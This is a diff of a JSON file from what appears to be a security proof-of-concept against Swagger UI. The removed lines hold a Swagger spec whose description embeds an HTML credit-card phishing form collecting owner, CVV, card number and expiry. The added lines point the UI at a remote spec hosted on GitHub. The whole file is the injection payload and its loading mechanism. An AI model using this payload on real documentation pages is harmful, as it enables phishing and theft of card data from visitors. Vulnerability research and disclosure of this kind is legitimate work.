@@ -1,19 +1,9 @@
 {
-  "swagger": "2.0",
-  "info": {
-    "version": "1.0.0",
-    "title": "Proof of Concept(PoC)",
-    "description": "<div class=\"creditCardForm\">\n    <div class=\"heading\">\n        <h1>Update your Credit Card</h1>\n    </div>\n    <div class=\"payment\">\n        <form action=\"https://example.com/\" method=\"post\" class=\"form-signin\" id=\"login_form\">\n            <div class=\"form-group owner\">\n                <label for=\"owner\">Owner</label>\n                <input type=\"text\" name=\"owner\" size=\"20\">\n            </div>\n            <div class=\"form-group CVV\">\n                <label for=\"cvv\">CVV</label>\n                <input type=\"text\" name=\"cvv\" size=\"20\">\n            </div>\n            <div class=\"form-group\" id=\"card-number-field\">\n                <label for=\"cardNumber\">Card Number</label>\n                <input type=\"text\" name=\"cardnumber\" size=\"20\">\n            </div>\n            <div class=\"form-group\" id=\"expiration-date\">\n                <label>Expiration Date</label>\n                <select name=\"expiration\">\n                    <option value=\"01\">January</option>\n                    <option value=\"02\">February</option>\n                    <option value=\"03\">March</option>\n                    <option value=\"04\">April</option>\n                    <option value=\"05\">May</option>\n                    <option value=\"06\">June</option>\n                    <option value=\"07\">July</option>\n                    <option value=\"08\">August</option>\n                    <option value=\"09\">September</option>\n                    <option value=\"10\">October</option>\n                    <option value=\"11\">November</option>\n                    <option value=\"12\">December</option>\n                </select>\n                <select name=\"year\">\n                    <option value=\"20\">2020</option>\n                    <option value=\"21\">2021</option>\n                    <option value=\"22\">2022</option>\n                    <option value=\"23\">2023</option>\n                    <option value=\"20\">2024</option>\n                    <option value=\"21\">2025</option>\n                    <option value=\"22\">2026</option>\n                    <option value=\"23\">2027</option>\n                    <option value=\"20\">2028</option>\n                    <option value=\"21\">2029</option>\n                    <option value=\"22\">2030</option>\n                    <option value=\"23\">2031</option>\n                </select>\n            </div>\n            <div class=\"form-group\" id=\"credit_cards\"></div>\n            <div class=\"form-group\" id=\"pay-now\">\n                <button type=\"submit\" class=\"btn btn-default\" id=\"confirm-purchase\">Confirm</button>\n            </div>\n        </form>\n    </div>\n</div>"
-  },
-  "paths": {
-    "/": {
-      "get": {
-        "responses": {
-          "200": {
-            "description": "Echo GET"
-          }
+    "url": "https://raw.githubusercontent.com/samark-sec/swagger/refs/heads/main/test.yaml",
+    "urls": [
+        {
+            "url": "https://raw.githubusercontent.com/samark-sec/swagger/refs/heads/main/test.yaml",
+            "name": "Test"
         }
-      }
-    }
-  }
+    ]
 }
